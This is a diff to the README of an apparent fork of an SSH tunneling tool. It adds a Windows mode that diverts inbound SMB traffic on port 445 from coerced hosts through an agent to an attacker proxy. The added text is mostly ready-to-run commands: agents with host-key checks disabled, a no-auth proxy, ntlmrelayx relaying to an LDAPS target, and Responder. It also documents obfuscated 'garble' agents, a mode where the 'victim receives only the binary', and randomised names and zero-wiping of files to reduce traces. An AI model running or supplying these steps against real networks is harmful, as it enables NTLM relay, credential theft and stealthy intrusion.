@@ -7,7 +7,8 @@ deserves full credit for the original project and core tunneling engine. This
 SSH fork is not an official upstream release.
 
 This release contains proxy and agent binaries for Windows/Linux AMD64/ARM64.
-The Garble agent accepts the same flags as the normal agent.
+The Garble agent accepts the same flags as the normal agent. The Windows AMD64
+directory also contains `agent-shadow.exe` and `agent-shadow-garble.exe`.
 
 SSH is the real agent-to-proxy transport. The proxy always needs an SSH host
 key because it is required to establish an encrypted SSH connection. In
@@ -92,6 +93,11 @@ mode. `agent-garble.exe` or `agent-garble` can replace the normal agent.
 
 ## No agent key: victim receives only the binary
 
+No-key mode requires flags on both sides:
+
+- Proxy: `-ssh-insecure-allow-no-auth`
+- Normal or ShadowPort agent: `-ssh-insecure-no-auth`
+
 Generate only `proxy-host` on the proxy. Start the proxy with the explicit
 no-auth flag:
 
@@ -159,6 +165,144 @@ the proxy. Enable this mode only for the assessment window and restrict the
 listener with firewall rules when possible.
 
 Both sides must opt in. A no-auth agent is rejected by a normal proxy.
+
+## ShadowPort SMB/445 (Windows AMD64)
+
+Use one of the separate ShadowPort binaries when Windows PID 4 already owns
+TCP/445. ShadowPort source-selects inbound SMB, translates it to an internal
+port, and carries the accepted stream to the proxy through SSH. It does not
+need WebDAV and leaves non-selected sources on the native SMB service.
+
+It needs elevated Administrator, not SYSTEM. The official signed WinDivert
+2.2.2 AMD64 driver is embedded and hash-pinned. It is extracted to a randomly
+named temporary directory only while a ShadowPort listener is active, the
+driver image file is deleted as soon as the driver service has started, and the
+remaining files are overwritten with zeros and removed during listener
+shutdown. The target needs only the EXE, but Windows still requires the driver
+to be materialized temporarily on disk when loaded. The firewall exception is
+registered through the native Windows Firewall COM API, without spawning
+PowerShell, scoped to the exact internal IP, port, and source allowlist, and
+named with a random hex token; it is removed during listener shutdown.
+
+With an SSH agent key:
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-key .\agent `
+  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+Without an agent key, but with proxy fingerprint verification:
+
+Start the proxy first. This command is shared by normal and ShadowPort agents;
+`-allow-shadow-port` belongs only on the ShadowPort agent.
+
+Windows proxy:
+
+```powershell
+.\proxy.exe `
+  -laddr ssh://0.0.0.0:22 `
+  -ssh-user ligolo `
+  -ssh-host-key .\keys\proxy-host `
+  -ssh-insecure-allow-no-auth
+```
+
+Linux proxy:
+
+```bash
+sudo ./proxy \
+  -laddr ssh://0.0.0.0:22 \
+  -ssh-user ligolo \
+  -ssh-host-key ./keys/proxy-host \
+  -ssh-insecure-allow-no-auth
+```
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-insecure-no-auth `
+  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+Binary-only/no pinning:
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-insecure-no-auth `
+  -ssh-insecure-ignore-host-key `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+`agent-shadow-garble.exe` uses the same flags.
+
+Run an SMB receiver beside the proxy, for example current Impacket:
+
+```bash
+sudo ntlmrelayx.py -ip 127.0.0.1 --smb-port 8445 -smb2support -t ldaps://RELAY_TARGET
+```
+
+Responder is also supported:
+
+```bash
+sudo responder -I PROXY_INTERFACE -v
+```
+
+Point the listener at `PROXY_INTERFACE_IPV4:445` instead of
+`127.0.0.1:8445` when using Responder.
+
+Select the agent in the proxy console:
+
+```text
+session
+listener_add --tcp --addr AGENT_IPV4:445 --to 127.0.0.1:8445 --shadow-port --shadow-internal-port 8445 --shadow-source COERCED_HOST_IPV4_OR_CIDR
+```
+
+Use the agent's exact IPv4 address, not `0.0.0.0`. Multiple sources/CIDRs are
+comma-separated. The internal port must be free on the agent; `--to` selects
+the independent proxy-side receiver port. `listener_stop` closes the diversion
+and removes its runtime files and firewall rule. The Web UI exposes the same
+fields when the agent advertises `shadowport-smb-v1`.
+
+Inspect and verify cleanup from elevated Windows PowerShell:
+
+```powershell
+Get-NetTCPConnection -State Listen |
+  Where-Object LocalPort -In 445,8445 |
+  Format-Table LocalAddress,LocalPort,OwningProcess
+Get-NetFirewallRule | Where-Object DisplayName -match '^[0-9a-f]{16}$'
+Get-ChildItem -Directory -LiteralPath $env:TEMP |
+  Where-Object { Test-Path (Join-Path $_.FullName 'WinDivert.dll') }
+```
+
+While a listener is active, the firewall query shows one scoped inbound rule
+named with 16 hex characters, and the directory query shows one directory
+holding `WinDivert.dll`; the driver image file is deleted as soon as the driver
+service has started, and a machine-wide `WinDivert` driver service exists only
+while a filter handle is open. After `listener_stop`, these queries should be
+empty. If the process was forcibly killed, review each rule's port and address
+scope (other software can also use hex-only names) and remove only the
+feature's residue:
+
+```powershell
+Get-NetFirewallRule | Where-Object DisplayName -match '^[0-9a-f]{16}$' |
+  Remove-NetFirewallRule
+Get-ChildItem -Directory -LiteralPath $env:TEMP |
+  Where-Object { Test-Path (Join-Path $_.FullName 'WinDivert.dll') } |
+  Remove-Item -Recurse -Force
+```
 
 ## Web UI
 
